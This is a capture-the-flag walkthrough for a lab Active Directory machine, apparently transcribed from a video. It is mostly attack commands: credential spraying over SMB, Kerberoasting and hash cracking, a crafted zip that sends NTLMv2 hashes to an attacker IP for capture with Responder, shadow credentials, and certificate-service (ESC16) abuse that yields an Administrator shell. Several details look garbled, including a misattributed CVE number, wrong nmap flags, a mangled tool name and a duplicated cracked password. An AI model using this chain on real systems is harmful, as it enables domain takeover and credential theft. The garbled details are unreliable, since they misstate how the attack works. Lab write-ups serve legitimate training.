## Initial Reconnaissance & Enumeration

The first step is to scan the target machine to identify open ports and services, and then enumerate basic Active Directory information.

### Nmap Scan

To discover open ports and services, the following Nmap command is used:

```bash
nmap -sc -sv -vv -oA fluffy 10.10.11.69
```

  * `-sc`: Enables default script scanning.
  * `-sv`: Probes open ports to determine service/version information.
  * `-vv`: Sets verbosity level to 2 (double verbose).
  * `-oA fluffy`: Outputs results in all major formats (XML, Grepable, Nmap) with the base name `fluffy`.
  * `10.10.11.69`: The IP address of the target machine.

From the Nmap results, the video identified the domain `fluffy.htb` and a Domain Controller `dc01.fluffy.htb`.

### Updating Hosts File

To resolve the domain names, add the following entries to your `/etc/hosts` file:

```bash
sudo vi /etc/hosts
```

Add these lines:

```
10.10.11.69 fluffy.htb dc01.fluffy.htb dc01
```

### Initial Credential Testing & Time Sync

The box provides an initial set of credentials for user `jfleshman`. First, test these credentials and synchronize time for Kerberos.

1.  **Store Credentials:**

    ```bash
    echo "jfleshman:PrometheusX303" > creds.txt
    ```

2.  **Test SMB Authentication:**

    ```bash
    netexec smb dc01.fluffy.htb -u jfleshman -p 'PrometheusX303'
    ```

3.  **Synchronize System Time:**

    ```bash
    sudo ntpdate fluffy.htb
    ```

### Kerberoasting & RastaHound

These steps are performed to gather Kerberos service tickets that might contain crackable hashes.

1.  **Kerberoasting (using `ldapsearch` via `crackmapexec`):**

    ```bash
    crackmapexec ldap dc01.fluffy.htb -u jfleshman -p 'PrometheusX303' --kerberoasting output.txt
    ```

2.  **RastaHound (BloodHound data collection):**

    ```bash
    RastaHound.py -d fluffy.htb -u jfleshman -p 'PrometheusX303' --dc 10.10.11.69
    ```

      * `RastaHound.py` collects a broader range of Active Directory information, including certificate data, which is useful for later stages.

3.  **Crack Kerberoasted Hashes (on a separate, more powerful machine like "Kraken" in the video):**
    Copy the `output.txt` (or similar hash file) to your cracking machine.

    ```bash
    scp output.txt user@kraken:/path/to/hashes/
    ```

    On the cracking machine:

    ```bash
    hashcat -m 13100 fluffy_kb.hash -o cracked_hashes.txt /usr/share/wordlists/rockyou.txt --force
    ```

      * `-m 13100`: Specifies the hash type for Kerberos 5 TGS-REP etype 23.
      * `fluffy_kb.hash`: The file containing the Kerberoasted hashes.
      * `-o cracked_hashes.txt`: Output file for cracked hashes.
      * `/usr/share/wordlists/rockyou.txt`: Path to a common wordlist.
      * `--force`: Forces hashcat to run even if some warnings are present.

### BloodHound Ingestion & Analysis

BloodHound helps visualize Active Directory attack paths.

1.  **Start BloodHound:**

    ```bash
    cd /opt/bloodhound-server
    docker-compose up -d
    ```

2.  **Access BloodHound:** Navigate to `http://localhost:8088` (or your configured port).

3.  **Ingest Data:** Upload the `.json` files generated by RastaHound.

4.  **Analyze User Privileges:** Search for the `jfleshman` user and examine their group memberships and outbound object control to identify any immediate attack paths. (In the video, this user had no immediately exploitable privileges for a quick escalation).

-----

## Gaining Access to a New Account

This section describes how to exploit a specific CVE to obtain credentials for another user.

### Enumerating SMB Shares

Identify accessible SMB shares using the `jfleshman` credentials.

```bash
crackmapexec smb 10.10.11.69 -u jfleshman -p 'PrometheusX303' --shares
```

The video identifies the `IT` share as having read/write access.

### Accessing the IT Share

Use `smbclient` to connect to the `IT` share and retrieve relevant files.

```bash
smbclient //10.10.11.69/IT -U jfleshman%'PrometheusX303'
```

Once inside `smbclient`:

```
dir
get "KeePass Upgrade Notice.pdf"
exit
```

### Exploiting CVE-2021-1675 (NTLMv2 Hash Capture)

The `KeePass Upgrade Notice.pdf` mentions several CVEs. One of them, after some research (in the video, through Google searches for "GitHub CVE-xxxx-xxxx" and blog posts), is identified as CVE-2021-1675, a vulnerability that can be used to capture NTLMv2 hashes when a specially crafted zip file is unzipped.

1.  **Clone the Exploit:**

    ```bash
    git clone https://github.com/lgandx/CVE-2021-1675
    cd CVE-2021-1675
    ```

2.  **Generate the Malicious Zip File:**

    ```bash
    python3 poc.py
    ```

      * Provide `malware.zip` as the filename.
      * Provide your attacker IP address (e.g., `10.10.14.8` if using a VPN like in HTB).

3.  **Set up Responder:**
    On your attacking machine, start Responder to capture the NTLMv2 hash.

    ```bash
    sudo responder -I tun0 -F
    ```

      * `-I tun0`: Specifies the interface to listen on (adjust if your VPN interface is different).
      * `-F`: Forces NTLM authentication, useful in some scenarios.

4.  **Upload the Zip File:**
    Upload `malware.zip` to the `IT` share using `smbclient`.

    ```bash
    smbclient //10.10.11.69/IT -U jfleshman%'PrometheusX303'
    put malware.zip
    ```

5.  **Wait for Hash Capture:** Wait for a user on the target machine to interact with the `malware.zip` file. Once they do, Responder will capture an NTLMv2 hash. The video captured the hash for user `pagula`.

### Crack the NTLMv2 Hash

1.  **Extract the Hash:** Copy the captured NTLMv2 hash from Responder's output.
2.  **Crack with Hashcat:**
    ```bash
    hashcat -m 5600 pagula_ntlmv2.hash /usr/share/wordlists/rockyou.txt --force
    ```
      * `-m 5600`: Specifies the hash type for NTLMv2.

The video successfully cracks the hash, revealing the password for `pagula` as `PrometheusX303`.

-----

## Privilege Escalation to Administrator

With the `pagula` credentials, the next stage involves exploiting Active Directory Certificate Services (ADCS) using the ESC16 vulnerability to gain administrator privileges.

### Verifying `pagula`'s Privileges

After obtaining `pagula`'s credentials, analyze their group memberships and permissions in BloodHound.

1.  **Update `creds.txt`:**

    ```bash
    echo "pagula:PrometheusX303" >> creds.txt
    ```

2.  **BloodHound Analysis:** Log in as `pagula` in BloodHound (mark as owned). The video notes `pagula` is a member of `Service Account Managers`, which grants `GenericAll` or `GenericWrite` permissions over several service accounts (e.g., `CA service`, `LDAP service`, `WinRM service`).

### Abusing `GenericWrite` on Service Accounts (Shadow Credentials)

The `pagula` user has `GenericWrite` on service accounts, allowing the modification of their properties, including the ability to generate "Shadow Credentials" (certificate-based authentication). This is done using `certipy`.

1.  **Add `pagula` to `Service Accounts` Group (if needed, due to potential cleanup scripts):**

    ```bash
    bloodyad add-group-member --user-dn pagula --group-dn "CN=Service Accounts,CN=Users,DC=fluffy,DC=htb" -u pagula -p 'PrometheusX303' --host 10.10.11.69 --domain fluffy.htb
    ```

      * Note: `bloodyad` commands are case-sensitive.

2.  **Generate Shadow Credential for `WinRM Service`:** This creates a certificate for the `WinRM service` account.

    ```bash
    certipy shadow -u pagula -p 'PrometheusX303' -target-user "WinRM Service" -ca "fluffy-DC01-CA" -dc-ip 10.10.11.69 -template User
    ```

    This command will output a NTLM hash for the `WinRM service` account. Store this hash.

3.  **Authenticate as `WinRM Service` (Optional, to get `user.txt`):**

    ```bash
    evil-winrm -i 10.10.11.69 -u 'WinRM Service' -H <NTLM_hash_of_WinRM_Service>
    ```

### Exploiting ADCS ESC16 (Certificate Authority Escalation)

This is the final privilege escalation step, targeting the Certificate Authority itself. ESC16 allows for weak certificate mapping due to a disabled security extension.

1.  **Find Vulnerable Certificates with `certipy`:**
    Use `certipy` with the `CA service` account's hash (obtained similarly to the `WinRM service` hash from `certipy shadow`).

    ```bash
    certipy find -u 'CA service' -hashes <NTLM_hash_of_CA_Service> -ca 'fluffy-DC01-CA' -dc-ip 10.10.11.69 --vulnerable
    ```

    The output will highlight ESC16 as a vulnerability, indicating that the security extension is disabled, making all certificates vulnerable.

2.  **Change `CA Service` UPN to `administrator`:**
    Modify the User Principal Name (UPN) of the `CA service` account to `administrator` using `bloodyad`. This leverages the `GenericWrite` privilege `pagula` has over service accounts.

    ```bash
    bloodyad set-user-property --identity 'CA Service' --property userprincipalname --value 'administrator@fluffy.htb' -u pagula -p 'PrometheusX303' --host 10.10.11.69 --domain fluffy.htb
    ```

      * **Important:** If `administrator@fluffy.htb` already exists as a UPN, try `administrator` without the domain, or another unique string that will be mapped to the `administrator` SID during certificate authentication due to the weak mapping.

3.  **Request a Certificate as `CA Service` (with `administrator` UPN):**
    Request a certificate using the `CA service` account's credentials, but with the UPN set to `administrator`.

    ```bash
    certipy req -u 'CA service' -hashes <NTLM_hash_of_CA_Service> -ca 'fluffy-DC01-CA' -template User -upn administrator -dc-ip 10.10.11.69 -output administrator.pfx
    ```

    This command generates a `.pfx` file (e.g., `administrator.pfx`) that contains a certificate with the Subject Alternate Name (SAN) of `administrator`.

4.  **Reset `CA Service` UPN:** Change the `CA service` UPN back to its original value (e.g., `caservice@fluffy.htb`). This is crucial because if the `CA service` account's UPN is `administrator`, the certificate would map to the `CA service` account and not the actual `administrator` account, causing authentication to fail.

    ```bash
    bloodyad set-user-property --identity 'CA Service' --property userprincipalname --value 'caservice@fluffy.htb' -u pagula -p 'PrometheusX303' --host 10.10.11.69 --domain fluffy.htb
    ```

5.  **Authenticate as Administrator using the PFX Certificate:**
    Use `evil-winrm` and the generated `.pfx` file to authenticate as the `administrator`.

    ```bash
    evil-winrm -i 10.10.11.69 -u Administrator -pfx administrator.pfx
    ```

    This will grant you an interactive PowerShell session as the `Administrator` user. You can then navigate to the Desktop to retrieve the `root.txt` flag.